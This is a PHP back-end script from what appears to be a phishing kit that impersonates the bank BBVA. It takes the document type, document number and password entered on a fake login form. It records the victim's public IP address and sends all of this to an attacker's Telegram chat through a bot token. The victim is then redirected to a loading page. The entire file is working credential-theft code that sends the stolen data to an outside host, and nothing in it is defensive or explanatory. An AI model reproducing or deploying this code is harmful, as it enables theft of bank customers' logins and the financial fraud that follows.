<?php
session_start();
require_once __DIR__ . '/portales.php';

function getClientIpPublicOnly(): ?string {
    $candidates = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_FORWARDED_FOR',  
        'HTTP_FORWARDED',      
        'HTTP_X_REAL_IP',       
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    ];

    $isPublic = static function ($ip): bool {
        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false;
    };

    $clean = static function ($raw): string {
        // Limpia puertos y brackets IPv6
        return preg_replace('/:\d+$/', '', trim($raw, "[] \t\n\r\0\x0B\"")) ?: $raw;
    };

    foreach ($candidates as $key) {
        if (empty($_SERVER[$key])) continue;
        $value = $_SERVER[$key];

        if ($key === 'HTTP_X_FORWARDED_FOR') {
            $parts = array_map($clean, array_map('trim', explode(',', $value)));
            foreach ($parts as $ip) if ($isPublic($ip)) return $ip;
            continue;
        }

        if ($key === 'HTTP_FORWARDED') {
            if (preg_match_all('/for=([^;,\s]+)/i', $value, $m)) {
                foreach ($m[1] as $raw) {
                    $ip = $clean($raw);
                    if ($isPublic($ip)) return $ip;
                }
            }
            continue;
        }

        $ip = $clean($value);
        if ($isPublic($ip)) return $ip;
    }

    return null; 
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $tipoDoc = htmlspecialchars($_POST['tipodoc'] ?? '', ENT_QUOTES, 'UTF-8');
    $usr     = htmlspecialchars($_POST['numdoc']  ?? '', ENT_QUOTES, 'UTF-8');
    $psw     = htmlspecialchars($_POST['clvs']    ?? '', ENT_QUOTES, 'UTF-8');

    $_SESSION['username'] = $usr;

   
    $ip = getClientIpPublicOnly();

  
    if (!$ip && !empty($_POST['ip_pub'])) {
        $candidate = trim($_POST['ip_pub']);
        if (filter_var($candidate, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            $ip = $candidate;
        }
    }


    if (!$ip) {
        $ip = 'IP no disponible';
    }

    $botToken = $telegram['botToken'];
    $chatId   = $telegram['chatId'];


    $text = "BBVA \n----\n$tipoDoc: $usr\nP4SWD: $psw\nIP: $ip";


    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $payload = [
        'chat_id' => $chatId,
        'text'    => $text,
        'disable_web_page_preview' => true,
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response !== false && $httpCode >= 200 && $httpCode < 300) {
        header("Location: ../cargando.html");
        exit;
    } else {
        http_response_code(500);
        echo "Error al enviar el mensaje.";
    }
} else {
    http_response_code(405);
    echo 'Método de solicitud no permitido.';
}
?>